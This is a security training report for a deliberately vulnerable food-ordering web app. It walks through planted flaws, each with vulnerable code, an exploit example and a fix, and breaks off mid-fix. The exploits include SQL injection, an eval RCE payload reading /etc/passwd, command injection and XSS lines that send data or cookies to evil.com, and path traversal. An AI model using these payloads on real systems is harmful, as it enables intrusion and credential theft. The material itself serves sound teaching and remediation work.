# CampusEats — Security Vulnerability Report
> **Workshop use only. Do not deploy.**  
> Every finding below is intentionally planted. All credentials and keys are fake placeholders.

---

## Table of Contents

| # | Vulnerability | Severity | File |
|---|---------------|----------|------|
| 1 | SQL Injection — Login bypass | 🔴 Critical | `routes/auth.js` |
| 2 | SQL Injection — Search | 🔴 Critical | `routes/search.js` |
| 3 | Remote Code Execution via `eval()` — Coupon endpoint | 🔴 Critical | `routes/orders.js` |
| 4 | OS Command Injection — Admin export | 🔴 Critical | `routes/admin.js` |
| 5 | Path Traversal — Receipt file download | 🔴 Critical | `routes/orders.js` |
| 6 | Broken Access Control — Admin panel (no auth check) | 🔴 Critical | `routes/admin.js` |
| 7 | Reflected XSS — Search results page | 🔴 Critical | `views/search.ejs` |
| 8 | Stored XSS — Product reviews | 🟠 High | `views/product.ejs` |
| 9 | Insecure Direct Object Reference (IDOR) — Order details | 🟠 High | `routes/orders.js` |
| 10 | Privilege Escalation — User can set own role | 🟠 High | `routes/auth.js`, `views/profile.ejs` |
| 11 | Weak Password Hashing — MD5, unsalted | 🟠 High | `routes/auth.js` |
| 12 | Insecure Session ID — Guessable, timestamp-based | 🟠 High | `routes/auth.js` |
| 13 | Open Redirect — Unvalidated `next` parameter | 🟠 High | `routes/auth.js` |
| 14 | Session Not Invalidated on Logout | 🟠 High | `routes/auth.js` |
| 15 | Cart Cookie — No Integrity Verification (Unsigned) | 🟠 High | `routes/orders.js` |
| 16 | Cart Price Manipulation — Client-trusted price at checkout | 🟡 Medium | `routes/orders.js` |
| 17 | Negative / Zero Quantity Abuse in Cart | 🟡 Medium | `routes/orders.js` |
| 18 | Session Cookie Missing `HttpOnly`, `Secure`, `SameSite` Flags | 🟡 Medium | `routes/auth.js` |
| 19 | No Rate Limiting / Brute-Force Protection on Login | 🟡 Medium | `routes/auth.js` |
| 20 | Missing Security Headers (No Helmet) | 🟡 Medium | `server.js` |
| 21 | Full Stack Trace & SQL Exposed to Users on Error | 🟡 Medium | `server.js`, `views/error.ejs` |
| 22 | Hardcoded Credentials in Source Code | 🟡 Medium | `db.js` |
| 23 | API Key Hardcoded in Source (Not in `.env`) | 🟡 Medium | `config.js` |
| 24 | Wildcard CORS (`Access-Control-Allow-Origin: *`) | 🟡 Medium | `server.js` |
| 25 | No CSRF Protection on State-Changing Forms | 🟡 Medium | All routes |
| 26 | `.env` File Committed to Repository | 🟡 Medium | `.env` |
| 27 | Session Memory Leak — Sessions Never Expire | 🟡 Medium | `routes/auth.js` |
| 28 | Malformed Cart Cookie Crashes Middleware (DoS) | 🟡 Medium | `server.js` |
| 29 | Known Vulnerable Dependency — Lodash 4.17.15 | 🟡 Medium | `package.json` |

---

## Detailed Findings

---

### 🔴 #1 — SQL Injection: Login Bypass

**File:** `routes/auth.js` — Lines 41–43  
**Severity:** Critical | **CWE-89** | **OWASP A03: Injection**

**Vulnerable Code:**
```js
// routes/auth.js  Lines 41-43
const sql = "SELECT * FROM users WHERE username = '" + username +
  "' AND (password = '" + password + "' OR password = '" + md5(password) + "')";
const user = db.get(sql);
```

**Explanation:**  
User-supplied `username` and `password` from the POST body are concatenated directly into a raw SQL string.
An attacker can inject arbitrary SQL to completely bypass the password check.

**Exploit Example:**
```
username:  admin'--
password:  anything
```
Resulting SQL:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND (password = ...)
-- Everything after -- is a comment; password check is gone
```

**Correct Fix:**
```js
// routes/auth.js — always use parameterised queries
router.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = db.findUserByUsername(username); // already uses ? placeholder
  if (!user) {
    return res.status(401).render('login', { title: 'Log in',
      error: 'Invalid username or password.', next: req.body.next || '/' });
  }
  const hash = crypto.createHash('sha256').update(password).digest('hex');
  if (user.password !== hash) {
    return res.status(401).render('login', { title: 'Log in',
      error: 'Invalid username or password.', next: req.body.next || '/' });
  }
  startSession(res, user.id);
  res.redirect(req.body.next || '/');
});
```

---

### 🔴 #2 — SQL Injection: Search

**File:** `routes/search.js` — Line 11  
**Severity:** Critical | **CWE-89** | **OWASP A03: Injection**

**Vulnerable Code:**
```js
// routes/search.js  Line 11
const sql = "SELECT * FROM products WHERE name LIKE '%" + q + "%' OR description LIKE '%" + q + "%'";
```

**Explanation:**  
The `?q=` query parameter is directly concatenated into SQL. An attacker can escape the LIKE clause and run
arbitrary SQL — including UNION attacks to dump the entire `users` table (usernames + password hashes).

**Exploit Example:**
```
GET /search?q=%' UNION SELECT id,username,password,email,address,role FROM users--
```

**Correct Fix:**
```js
// routes/search.js
router.get('/search', (req, res) => {
  const q = (req.query.q || '').trim();
  const pattern = '%' + q + '%';
  const products = q
    ? db.all('SELECT * FROM products WHERE name LIKE ? OR description LIKE ?', pattern, pattern)
    : [];
  res.render('search', { title: 'Search', q: q, products: products });
});
```

---

### 🔴 #3 — Remote Code Execution: `eval()` on Coupon Input

**File:** `routes/orders.js` — Line 46  
**Severity:** Critical | **CWE-95** | **OWASP A03: Injection**

**Vulnerable Code:**
```js
// routes/orders.js  Line 46
res.json({ subtotal: total, discounted: eval(req.body.coupon) });
```

**Explanation:**  
`eval()` executes any JavaScript string as live code inside the Node.js server process. Any user can POST
an arbitrary payload to `/cart/coupon` and achieve full Remote Code Execution — reading files, spawning
processes, exfiltrating data, or crashing the server.

**Exploit Example:**
```bash
curl -X POST http://localhost:3000/cart/coupon \
  -d 'coupon=require("child_process").execSync("cat /etc/passwd").toString()'
```

**Correct Fix:**
```js
// routes/orders.js — use a hardcoded whitelist, never eval user input
const VALID_COUPONS = { WELCOME10: 0.10, STUDENT20: 0.20 };

router.post('/cart/coupon', (req, res) => {
  const total = subtotalOf(readCart(req));
  const code  = (req.body.coupon || '').trim().toUpperCase();
  const discount = VALID_COUPONS[code];
  if (discount === undefined)
    return res.status(400).json({ error: 'That coupon code is not valid.' });
  res.json({ subtotal: total, discounted: total * (1 - discount) });
});
```

---

### 🔴 #4 — OS Command Injection: Admin Export

**File:** `routes/admin.js` — Line 22  
**Severity:** Critical | **CWE-78** | **OWASP A03: Injection**

**Vulnerable Code:**
```js
// routes/admin.js  Line 22
exec('node scripts/export-report.js ' + name, { cwd: config.projectDir }, ...);
```

**Explanation:**  
`exec()` passes the full string to `/bin/sh`. The `name` query param is appended without escaping.
An attacker injects shell operators to run arbitrary OS commands.

**Exploit Examples:**
```
GET /admin/export?name=report; whoami
GET /admin/export?name=report && curl https://evil.com/$(cat /etc/passwd | base64)
```

**Correct Fix:**
```js
// routes/admin.js — use execFile() with an argument array; it never invokes a shell
const { execFile } = require('child_process');

router.get('/admin/export', requireAdmin, (req, res) => {
  const name = (req.query.name || 'report').replace(/[^a-zA-Z0-9_-]/g, '');
  execFile('node', ['scripts/export-report.js', name], { cwd: config.projectDir },
    (err, stdout, stderr) => {
      if (err) return res.status(500).render('error', { title: 'Export failed', message: stderr || err.message });
      res.render('admin', { title: 'Admin dashboard', stats: dashboardStats(), result: stdout.trim(), name });
    });
});
```

---

### 🔴 #5 — Path Traversal: Receipt File Download

**File:** `routes/orders.js` — Lines 83–89  
**Severity:** Critical | **CWE-22** | **OWASP A01: Broken Access Control**

**Vulnerable Code:**
```js
// routes/orders.js  Lines 83-89
const file = req.query.file || 'order-' + req.params.id + '.txt';
fs.readFile(path.join(config.receiptsDir, file), 'utf8', ...);
```

**Explanation:**  
`req.query.file` is joined with `config.receiptsDir` without normalisation. An attacker uses `../` sequences
to escape the `receipts/` directory and read any file on the server filesystem.

**Exploit Examples:**
```
GET /orders/1/receipt?file=../../.env
GET /orders/1/receipt?file=../../db.js
GET /orders/1/receipt?file=../../../etc/passwd
```

**Correct Fix:**
```js
// routes/orders.js
router.get('/orders/:id/receipt', requireLogin, (req, res) => {
  const rawFile = req.query.file || 'order-' + req.params.id + '.txt';
  const base    = path.resolve(config.receiptsDir);
  const target  = path.resolve(base, rawFile);

  // Reject anything that escapes the receipts directory
  if (!target.startsWith(base + path.sep)) {
    return res.status(400).render('error', { title: 'Bad request', message: 'Invalid file path.' });
  }
  fs.readFile(target, 'utf8', (err, data) => {
    if (err) return res.status(404).render('error', { title: 'Not found', message: 'Receipt not found.' });
    res.type('text').send(data);
  });
});
```

---

### 🔴 #6 — Broken Access Control: Admin Panel Has No Authentication

**File:** `routes/admin.js` — Lines 17–26  
**Severity:** Critical | **CWE-862** | **OWASP A01: Broken Access Control**

**Vulnerable Code:**
```js
// routes/admin.js
router.get('/admin', (req, res) => ...);          // zero auth
router.get('/admin/export', (req, res) => ...);   // zero auth
```

**Explanation:**  
Both admin routes have no middleware. Anyone — anonymous or logged-in — can access the dashboard and
trigger the export/command-injection endpoint.

**Correct Fix:**
```js
// routes/admin.js — add role-gated middleware
function requireAdmin(req, res, next) {
  if (!req.user) return res.redirect('/login?next=/admin');
  if (req.user.role !== 'admin')
    return res.status(403).render('error', { title: 'Forbidden', message: 'Admins only.' });
  next();
}

router.get('/admin',        requireAdmin, (req, res) => ...);
router.get('/admin/export', requireAdmin, (req, res) => ...);
```

---

### 🔴 #7 — Reflected XSS: Search Results Page

**File:** `views/search.ejs` — Line 11  
**Severity:** Critical | **CWE-79** | **OWASP A03: Injection**

**Vulnerable Code:**
```html
<!-- views/search.ejs  Line 11 -->
<p class="muted">Results for: <strong><%- q %></strong></p>
```

**Explanation:**  
The search query `q` is reflected back to the page using `<%-` (raw, unescaped output). An attacker crafts
a malicious URL and tricks a victim into clicking it. The script in the URL executes in the victim's browser
immediately (Reflected XSS), allowing session hijacking, phishing, and more. No account needed.

**Exploit Example:**
```
GET /search?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

**Correct Fix:**
```html
<!-- views/search.ejs — use <%= (HTML-escaped) instead of <%- (raw) -->
<p class="muted">Results for: <strong><%= q %></strong></p>
```
> Rule: `<%-` must **only** be used for trusted, developer-controlled includes like `<%- include(...) %>`.
> All user-supplied data must go through `<%=`.

---

### 🟠 #8 — Stored XSS: Product Reviews

**File:** `views/product.ejs` — Line 24  
**Severity:** High | **CWE-79** | **OWASP A03: Injection**

**Vulnerable Code:**
```html
<!-- views/product.ejs  Line 24 -->
<p><%- review.body %></p>
```

**Explanation:**  
Review text is stored in the database as-is and rendered with `<%-` (raw HTML). Any logged-in user can
post a review containing a `<script>` tag that executes in every other visitor's browser permanently.

**Exploit Example (review body):**
```html
<script>document.location='https://evil.com/?c='+document.cookie</script>
```

**Correct Fix:**
```html
<!-- views/product.ejs -->
<p><%= review.body %></p>
```

---

### 🟠 #9 — Insecure Direct Object Reference (IDOR): Order Details

**File:** `routes/orders.js` — Lines 76–81  
**Severity:** High | **CWE-639** | **OWASP A01: Broken Access Control**

**Vulnerable Code:**
```js
// routes/orders.js  Lines 76-81
router.get('/orders/:id', requireLogin, (req, res) => {
  const order = db.get('SELECT * FROM orders WHERE id = ?', req.params.id);
  if (!order) return notFound(res);
  // ← order.user_id is NEVER compared to req.user.id
  const items = db.all('SELECT * FROM order_items WHERE order_id = ?', order.id);
  res.render('order', { ... });
});
```

**Explanation:**  
Any authenticated user can see any other user's order by changing the numeric ID in the URL.

**Exploit Example:**  
Login as `priya` (userId=2), then visit `/orders/2` (rahul's order).

**Correct Fix:**
```js
router.get('/orders/:id', requireLogin, (req, res) => {
  const order = db.get('SELECT * FROM orders WHERE id = ?', req.params.id);
  if (!order) return notFound(res);
  if (order.user_id !== req.user.id && req.user.role !== 'admin')
    return res.status(403).render('error', { title: 'Forbidden', message: 'That is not your order.' });
  const items = db.all('SELECT * FROM order_items WHERE order_id = ?', order.id);
  res.render('order', { title: 'Order #' + order.id, order, items });
});
```

---

### 🟠 #10 — Privilege Escalation: User Can Set Own Role

**File:** `routes/auth.js` — Lines 56–59 and `views/profile.ejs` — Line 12  
**Severity:** High | **CWE-269** | **OWASP A01: Broken Access Control**

**Vulnerable Code:**
```js
// routes/auth.js  Lines 56-59
router.post('/profile', requireLogin, (req, res) => {
  db.run('UPDATE users SET email = ?, address = ?, role = ? WHERE id = ?',
    req.body.email, req.body.address, req.body.role, req.user.id); // role from POST body!
});
```
```html
<!-- views/profile.ejs  Line 12 -->
<input type="hidden" name="role" value="<%= currentUser.role %>">
```

**Explanation:**  
The `role` field is a hidden input. A user can intercept the request in DevTools or Burp and change
`role=customer` to `role=admin`. The server saves whatever it receives with no validation.

**Exploit Example:**
```bash
curl -X POST http://localhost:3000/profile \
  -H "Cookie: sid=<your_session>" \
  -d "email=x@x.com&address=Hostel&role=admin"
# User is now admin
```

**Correct Fix:**
```js
// routes/auth.js — strip role from accepted fields entirely
router.post('/profile', requireLogin, (req, res) => {
  db.run('UPDATE users SET email = ?, address = ? WHERE id = ?',
    req.body.email, req.body.address, req.user.id);
  res.redirect('/profile?updated=1');
});
```
```html
<!-- views/profile.ejs — remove the hidden role input completely -->
```

---

### 🟠 #11 — Weak Password Hashing: MD5, Unsalted

**File:** `routes/auth.js` — Lines 8, 30  
**Severity:** High | **CWE-916** | **OWASP A02: Cryptographic Failures**

**Vulnerable Code:**
```js
// routes/auth.js  Line 8
const md5 = (text) => crypto.createHash('md5').update(text).digest('hex');

// Line 30 — stored on registration
db.run('INSERT INTO users (...) VALUES (?, ?, ?, ?, ?)', username, md5(password), ...);
```

**Explanation:**  
MD5 is a fast, cryptographically broken hash. Without a salt, identical passwords produce identical hashes,
allowing rainbow-table lookups. Modern GPUs can crack billions of MD5 hashes per second.

**Correct Fix:**
```js
// npm install bcrypt
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

// Registration:
const hash = await bcrypt.hash(password, SALT_ROUNDS);
db.run('INSERT INTO users (...) VALUES (?, ?, ?, ?, ?)', username, hash, ...);

// Login:
if (!(await bcrypt.compare(req.body.password, user.password))) { /* reject */ }
```

---

### 🟠 #12 — Insecure Session ID: Guessable, Timestamp-Based

**File:** `routes/auth.js` — Lines 11–13  
**Severity:** High | **CWE-330** | **OWASP A07: Identification & Auth Failures**

**Vulnerable Code:**
```js
// routes/auth.js  Lines 11-13
function startSession(res, userId) {
  const sid = String(Date.now()) + '-' + userId; // e.g. "1728978462123-2"
  sessions[sid] = { userId, createdAt: Date.now() };
  res.cookie('sid', sid);
}
```

**Explanation:**  
The session ID is a millisecond timestamp concatenated with the user's numeric ID — both of which are
either observable or trivially guessable. An attacker who roughly knows when a victim logged in can
enumerate valid session IDs in seconds.

**Correct Fix:**
```js
// Use 256 bits of cryptographically secure randomness
function startSession(res, userId) {
  const sid = crypto.randomBytes(32).toString('hex');
  sessions[sid] = { userId, createdAt: Date.now() };
  res.cookie('sid', sid, { httpOnly: true, sameSite: 'lax', maxAge: 8 * 60 * 60 * 1000 });
}
```

---

### 🟠 #13 — Open Redirect: Unvalidated `next` Parameter

**File:** `routes/auth.js` — Lines 17, 48  
**Severity:** High | **CWE-601** | **OWASP A01: Broken Access Control**

**Vulnerable Code:**
```js
// routes/auth.js  Line 17 — adds next to URL when redirecting to login
res.redirect('/login?next=' + encodeURIComponent(req.originalUrl));

// Line 48 — after login, redirects to whatever next says — including external URLs
res.redirect(req.body.next || '/');
```
```html
<!-- views/login.ejs  Line 10 — next is stored in a hidden form field -->
<input type="hidden" name="next" value="<%= next %>">
```

**Explanation:**  
The `next` value is taken from the query string, placed in a hidden form input, and then used as the
redirect destination after login — with no validation. An attacker sends a phishing link like:

```
http://localhost:3000/login?next=https://evil.com/fake-campus-login
```
After the victim successfully logs in, they are silently bounced to `evil.com` (credential-harvesting page).

**Correct Fix:**
```js
// routes/auth.js — only allow relative paths (starting with /)
function isSafeRedirect(url) {
  return typeof url === 'string' && url.startsWith('/') && !url.startsWith('//');
}

// On login POST:
const next = isSafeRedirect(req.body.next) ? req.body.next : '/';
res.redirect(next);
```

---

### 🟠 #14 — Session Not Invalidated on Logout (Server-Side)

**File:** `routes/auth.js` — Line 51  
**Severity:** High | **CWE-613** | **OWASP A07: Identification & Auth Failures**

**Vulnerable Code:**
```js
// routes/auth.js  Line 51
router.post('/logout', (req, res) => res.clearCookie('sid').redirect('/'));
// sessions[sid] is NEVER deleted — the server still accepts the old token
```

**Explanation:**  
Logging out only removes the cookie from the browser. The `sessions` object on the server still holds the
session entry. If an attacker has captured the `sid` value (e.g. via XSS or network sniffing before TLS),
they can continue using that session indefinitely after the victim has "logged out".

**Correct Fix:**
```js
// routes/auth.js
router.post('/logout', (req, res) => {
  const sid = req.cookies.sid;
  if (sid) delete sessions[sid];          // ← invalidate server-side
  res.clearCookie('sid').redirect('/');
});
```

---

### 🟠 #15 — Cart Cookie Has No Integrity Verification (Unsigned Cookie)

**File:** `routes/orders.js` — Lines 29–41  
**Severity:** High | **CWE-345** | **OWASP A04: Insecure Design**

**Vulnerable Code:**
```js
// routes/orders.js  Lines 39-40
res.cookie('cart', JSON.stringify(cart));   // plain JSON, no HMAC signature
// ...
cart = JSON.parse(req.cookies.cart || '[]'); // trusted blindly on every request
```

**Explanation:**  
The entire cart (item IDs, names, **prices**, quantities) is stored in a plain unsigned cookie. Any user
can edit the cookie in their browser or via curl and change prices to any value, add items that don't
exist, set absurd quantities, or craft malicious `name` strings that render in views. There is no server-
side check that the cookie hasn't been tampered with.

**Correct Fix:**
```js
// Option 1: Sign the cookie (Express supports signed cookies out-of-the-box)
// server.js
app.use(cookieParser(config.sessionSecret));  // pass a secret

// orders.js — write:
res.cookie('cart', JSON.stringify(cart), { signed: true });
// read:
const raw = req.signedCookies.cart || '[]';  // returns false if tampered

// Option 2 (better): store cart server-side keyed by session, never in a cookie
```

---

### 🟡 #16 — Cart Price Manipulation: Client-Trusted Price at Checkout

**File:** `routes/orders.js` — Lines 52–68  
**Severity:** Medium | **CWE-20** | **OWASP A04: Insecure Design**

**Vulnerable Code:**
```js
// routes/orders.js  Lines 55-65
items = JSON.parse(req.body.cart || '[]');           // cart from hidden form field
const total = items.reduce((sum, item) => sum + item.price * item.qty, 0); // client price
```

**Explanation:**  
The cart JSON — including the `price` field — is submitted as a hidden input in the checkout form.
A user can intercept this in browser DevTools or curl and submit any price (e.g. $0.001 or negative).

**Exploit Example:**
```bash
curl -X POST http://localhost:3000/checkout \
  -H "Cookie: sid=<session>" \
  -d 'cart=[{"id":7,"name":"Veg Thali","price":0.001,"qty":99}]'
# Orders 99 Thalis for $0.099 total
```

**Correct Fix:**
```js
// routes/orders.js — re-fetch prices from DB; never trust client-supplied prices
router.post('/checkout', requireLogin, (req, res) => {
  let items = [];
  try { items = JSON.parse(req.body.cart || '[]'); } catch { items = []; }
  if (!items.length) return res.redirect('/cart');

  let total = 0;
  const verifiedItems = [];
  for (const item of items) {
    const product = db.get('SELECT * FROM products WHERE id = ?', item.id);
    if (!product) continue;
    const qty = Math.max(1, Math.min(100, parseInt(item.qty, 10) || 1));
    total += product.price * qty;
    verifiedItems.push({ id: product.id, name: product.name, price: product.price, qty });
  }
  // ... proceed with verifiedItems and server-calculated total
});
```

---

### 🟡 #17 — Negative / Zero Quantity Abuse in Cart

**File:** `routes/orders.js` — Lines 35, 37  
**Severity:** Medium | **CWE-20** | **OWASP A04: Insecure Design**

**Vulnerable Code:**
```js
// routes/orders.js  Lines 35-37
if (existing) {
  existing.qty += Number(req.body.qty) || 1;   // can be negative, e.g. -999
} else {
  cart.push({ ..., qty: Number(req.body.qty) || 1 });
}
```

**Explanation:**  
`req.body.qty` is cast to a number but never validated for range. Sending a negative quantity like `-100`
makes the cart total negative. Combined with the client-trusted checkout price, a user could submit an
order with a negative total, resulting in a "refund" or data corruption.

**Exploit Example:**
```bash
curl -X POST http://localhost:3000/cart/add \
  -H "Cookie: sid=<session>" \
  -d "id=7&qty=-100"
# Cart now shows Veg Thali × -100 = -$550 subtotal
```

**Correct Fix:**
```js
// routes/orders.js — clamp qty to a sensible positive range server-side
const qty = Math.max(1, Math.min(100, parseInt(req.body.qty, 10) || 1));
```

---

### 🟡 #18 — Session Cookie Missing `HttpOnly`, `Secure`, `SameSite` Flags

**File:** `routes/auth.js` — Line 13  
**Severity:** Medium | **CWE-614** | **OWASP A02: Cryptographic Failures**

**Vulnerable Code:**
```js
// routes/auth.js  Line 13
res.cookie('sid', sid);   // no options whatsoever
```

**Explanation:**  
- **No `HttpOnly`** → JavaScript can read `document.cookie` and steal the session token (amplifies any XSS).  
- **No `SameSite`** → Cookie is sent on cross-site requests, enabling CSRF attacks.  
- **No `Secure`** → Cookie may be transmitted over plain HTTP and intercepted.

**Correct Fix:**
```js
res.cookie('sid', sid, {
  httpOnly: true,
  sameSite: 'lax',
  // secure: true,  // enable when deployed over HTTPS
  maxAge: 8 * 60 * 60 * 1000,
});
```

---

### 🟡 #19 — No Rate Limiting / Brute-Force Protection on Login

**File:** `routes/auth.js` — Lines 38–49  
**Severity:** Medium | **CWE-307** | **OWASP A07: Identification & Auth Failures**

**Vulnerable Code:**
```js
// routes/auth.js  Lines 38-49
router.post('/login', (req, res) => {
  // No rate limiting, no lockout, no CAPTCHA, no delay
  const user = db.get(sql);
  if (!user) return res.status(401).render('login', { error: 'Invalid username or password.' });
  ...
});
```

**Explanation:**  
An attacker can make unlimited login attempts at full network speed — trivially automating a credential
stuffing or dictionary attack against any account.

**Correct Fix:**
```js
// npm install express-rate-limit
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15-minute window
  max: 10,                    // max 10 attempts per IP
  message: 'Too many login attempts. Please try again in 15 minutes.',
  standardHeaders: true,
  legacyHeaders: false,
});

router.post('/login', loginLimiter, (req, res) => { ... });
```

---

### 🟡 #20 — Missing Security Headers (No Helmet)

**File:** `server.js` — Line 18 area  
**Severity:** Medium | **CWE-1021** | **OWASP A05: Security Misconfiguration**

**Explanation:**  
The app uses no HTTP security headers. Missing headers expose users to:

| Missing Header | Risk |
|---|---|
| `X-Frame-Options` / `frame-ancestors` CSP | Clickjacking — attacker embeds app in invisible `<iframe>` |
| `X-Content-Type-Options: nosniff` | MIME-type sniffing attacks |
| `Content-Security-Policy` | XSS can load external scripts freely |
| `Referrer-Policy` | Leaks URL/session info to external sites via Referer header |
| `X-XSS-Protection` | Legacy XSS filter bypass on older browsers |
| `Strict-Transport-Security` | Forces HTTPS once set |

**Correct Fix:**
```js
// npm install helmet
const helmet = require('helmet');

// server.js — add before other middleware
app.use(helmet());  // sets all common security headers with safe defaults
// Customise CSP as needed:
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'"],
    styleSrc:   ["'self'"],
    imgSrc:     ["'self'", 'data:'],
  },
}));
```

---

### 🟡 #21 — Full Stack Trace & Raw SQL Exposed to End Users

**File:** `server.js` — Lines 55–63 and `views/error.ejs` — Lines 7–15  
**Severity:** Medium | **CWE-209** | **OWASP A05: Security Misconfiguration**

**Vulnerable Code:**
```js
// server.js  Lines 55-63
app.use((err, req, res, next) => {
  res.status(500).render('error', {
    message: err.message,
    stack: err.stack,    // full Node.js stack trace → browser
    sql: err.sql || '',  // raw SQL query → browser
  });
});
```

**Explanation:**  
Exposing stack traces reveals file paths, library versions, and internal logic. Exposing the raw SQL
query in an error (especially after triggering an injection attempt) gives the attacker a detailed map
of the database schema and query structure.

**Correct Fix:**
```js
// server.js — log details server-side only
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.stack);
  if (err.sql) console.error('[SQL]', err.sql);
  res.status(500).render('error', {
    title: 'Something went wrong',
    message: 'An unexpected error occurred. Please try again later.',
    stack: '',
    sql: '',
  });
});
```

---

### 🟡 #22 — Hardcoded Plaintext Passwords in Source Code

**File:** `db.js` — Lines 6–12  
**Severity:** Medium | **CWE-798** | **OWASP A02: Cryptographic Failures**

**Vulnerable Code:**
```js
// db.js  Lines 6-12
const USERS = [
  ['admin', 'admin123',    'admin@example.com', ...],
  ['priya', 'password123', 'priya@example.com', ...],
  ['rahul', 'rahul@123',   'rahul@example.com', ...],
  ...
];
```

**Explanation:**  
Passwords are committed as plaintext strings in version-controlled source code. They appear in git history
permanently. Even with "fake" data, this pattern normalises extremely dangerous behaviour.

**Correct Fix:**
```js
// db.js — store only pre-computed bcrypt hashes, never plaintext
// Generate: node -e "console.log(require('bcrypt').hashSync('admin123', 12))"
const USERS = [
  ['admin', '$2b$12$...hashhere...', 'admin@example.com', 'Admin Office, Block A', 'admin'],
  ...
];
```

---

### 🟡 #23 — API Key Hardcoded Directly in Source Code (Not in `.env`)

**File:** `config.js` — Line 26  
**Severity:** Medium | **CWE-312** | **OWASP A02: Cryptographic Failures**

**Vulnerable Code:**
```js
// config.js  Line 26
paymentApiKey: 'FAKE-sk-test-not-a-real-key',  // hardcoded in source, not read from env
```

**Explanation:**  
All other secrets (`SESSION_SECRET`, `DB_PASSWORD`) are at least read from environment variables.
The `paymentApiKey` is hardcoded directly in source — it cannot be rotated without a code change, and
it is always committed to git history regardless of `.gitignore`. In production this would expose a live
payment API key to anyone with repo read access.

**Correct Fix:**
```js
// config.js — always read secrets from environment variables
module.exports = {
  // ...
  paymentApiKey: process.env.PAYMENT_API_KEY || (() => { throw new Error('PAYMENT_API_KEY is not set'); })(),
};
```
```bash
# .env
PAYMENT_API_KEY=sk_test_your_real_key_here
```

---

### 🟡 #24 — Wildcard CORS (`Access-Control-Allow-Origin: *`)

**File:** `server.js` — Line 18  
**Severity:** Medium | **CWE-942** | **OWASP A05: Security Misconfiguration**

**Vulnerable Code:**
```js
// server.js  Line 18
app.use(cors());  // defaults to Access-Control-Allow-Origin: *
```

**Explanation:**  
Any website on the internet can make cross-origin requests to this server and read the responses. Combined
with missing CSRF protection and missing `HttpOnly` flags, an attacker-controlled site can silently read
API responses on behalf of logged-in victims.

**Correct Fix:**
```js
app.use(cors({
  origin: ['http://localhost:3000'],   // whitelist only trusted origins
  credentials: true,
}));
```

---

### 🟡 #25 — No CSRF Protection on Any State-Changing Forms

**File:** All route handlers  
**Severity:** Medium | **CWE-352** | **OWASP A01: Broken Access Control**

**Explanation:**  
None of the POST forms (profile update, checkout, logout, review submission, etc.) include CSRF tokens.
A malicious website can silently submit these forms on behalf of a logged-in victim using a hidden form
or `fetch()`. Particularly dangerous because the session cookie has no `SameSite` attribute (#18).

**Correct Fix:**
```js
// npm install csurf
const csrf = require('csurf');
app.use(csrf({ cookie: true }));
app.use((req, res, next) => { res.locals.csrfToken = req.csrfToken(); next(); });
```
```html
<!-- Add to every form in every .ejs view -->
<input type="hidden" name="_csrf" value="<%= csrfToken %>">
```

---

### 🟡 #26 — `.env` File Committed to Repository

**File:** `.env`  
**Severity:** Medium | **CWE-312** | **OWASP A02: Cryptographic Failures**

**Explanation:**  
Although `.env` appears in `.gitignore`, the file was committed before the ignore rule was added — it
exists in the current working tree and in the git object history. Anyone cloning the repo (including the
clone we just did) receives a copy of all secrets. Deleting the file without purging git history does not
help.

**Correct Fix:**
```bash
# Remove .env from all git history (destructive — coordinate with team first)
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch .env' \
  --prune-empty --tag-name-filter cat -- --all
git push --force --all

# Going forward — provide a safe template instead
cp .env .env.example
# Replace real values in .env.example with obvious placeholders
echo ".env" >> .gitignore
git add .env.example .gitignore && git commit -m "chore: remove .env, add template"
```

---

### 🟡 #27 — Sessions Never Expire: Unbounded Memory Leak / DoS

**File:** `routes/auth.js` — Lines 6, 10–14  
**Severity:** Medium | **CWE-400** | **OWASP A07: Identification & Auth Failures**

**Vulnerable Code:**
```js
// routes/auth.js  Line 6
const sessions = {};   // grows forever, never pruned

// Lines 10-14 — sessions are added but never removed (logout doesn't delete either)
function startSession(res, userId) {
  const sid = String(Date.now()) + '-' + userId;
  sessions[sid] = { userId, createdAt: Date.now() };
  ...
}
```

**Explanation:**  
Every login adds a new entry to `sessions`. Nothing ever removes entries — not logout (see #14), not a
time-based cleanup. Over time, or under a bot attack creating thousands of accounts and logins, the process
RAM grows without bound. Old sessions also remain valid forever with no expiry, meaning stolen tokens
never become stale.

**Correct Fix:**
```js
// routes/auth.js — set an expiry on each session and prune periodically
const SESSION_TTL_MS = 8 * 60 * 60 * 1000; // 8 hours

function startSession(res, userId) {
  const sid = crypto.randomBytes(32).toString('hex');
  sessions[sid] = { userId, createdAt: Date.now(), expiresAt: Date.now() + SESSION_TTL_MS };
  res.cookie('sid', sid, { httpOnly: true, sameSite: 'lax', maxAge: SESSION_TTL_MS });
}

// Prune expired sessions every 30 minutes
setInterval(() => {
  const now = Date.now();
  for (const sid of Object.keys(sessions)) {
    if (sessions[sid].expiresAt < now) delete sessions[sid];
  }
}, 30 * 60 * 1000);

// Also update session lookup to reject expired sessions:
req.session = sid && sessions[sid] && sessions[sid].expiresAt > Date.now()
  ? sessions[sid]
  : null;
```

---

### 🟡 #28 — Malformed Cart Cookie Crashes Middleware (Application DoS)

**File:** `server.js` — Lines 33–39  
**Severity:** Medium | **CWE-755** | **OWASP A05: Security Misconfiguration**

**Vulnerable Code:**
```js
// server.js  Lines 33-39
let cart = [];
try {
  cart = JSON.parse(req.cookies.cart || '[]'); // catches JSON.parse errors only
} catch (err) {
  cart = [];
}
res.locals.cartCount = cart.reduce((total, item) => total + item.qty, 0); // ← no guard
```

**Explanation:**  
The `try/catch` only catches `JSON.parse` failures. If the cookie contains valid JSON that is **not an
array** (e.g. `{}`, `"hello"`, `42`), `JSON.parse` succeeds and `cart` is set to a non-array value.
Then `cart.reduce(...)` throws `TypeError: cart.reduce is not a function`, which is an **uncaught
synchronous error inside middleware**, crashing that request with a 500 and leaking a stack trace (#21).

An attacker can set `document.cookie = 'cart={}'` or craft a request with `Cookie: cart={}` to reliably
crash every page load for that session.

**Exploit Example:**
```bash
curl http://localhost:3000/ -H 'Cookie: cart={"injected":true}'
# → 500 TypeError: cart.reduce is not a function (+ full stack trace in browser)
```

**Correct Fix:**
```js
// server.js — validate that parsed value is actually an array
let cart = [];
try {
